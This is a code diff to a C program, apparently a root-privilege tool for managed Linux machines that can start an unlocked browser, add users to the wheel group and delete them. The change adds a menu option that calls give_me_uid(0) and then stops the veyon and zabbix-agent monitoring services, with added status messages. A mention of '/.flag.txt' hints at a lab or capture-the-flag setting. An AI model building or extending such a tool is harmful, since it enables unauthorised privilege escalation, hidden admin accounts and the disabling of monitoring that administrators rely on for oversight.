@@ -30,7 +30,8 @@ void show_usage() {
 	printf("3. Start unlocked firefox\n");
 	printf("4. Add user in wheel group\n");
 	printf("5. Delete already added user\n");
-	printf("6. (...) More to be added?\n");
+	printf("6. Stop monitoring services (zabbix, veyon)\n");
+	printf("7. (...) More to be added?\n");
 	printf("write your suggestions to /.flag.txt\n");
 	return;
 }
@@ -98,8 +99,10 @@ int delete_wheel_user(void) {
 int stop_monitoring_services(void) {
 	give_me_uid(0);
 	system("systemctl stop veyon.service");
+	printf("[+] Stopped veyon\n");
 	system("systemctl stop zabbix-agent.service");
-	printf_success("[+] Stopped monitoring!");
+	printf("[+] Stopped zabbix-agent\n");
+	printf_success("[+] Stopped monitoring!\n");
 	return 0;
 
 }
@@ -142,6 +145,9 @@ neofetch:
 		}
 		else if (ch == 5) {
 			return delete_wheel_user();
+		}
+		else if (ch == 6) {
+			return stop_monitoring_services();
 		}
 		else {
 			printf("[-] FAIL: unk_error\n");
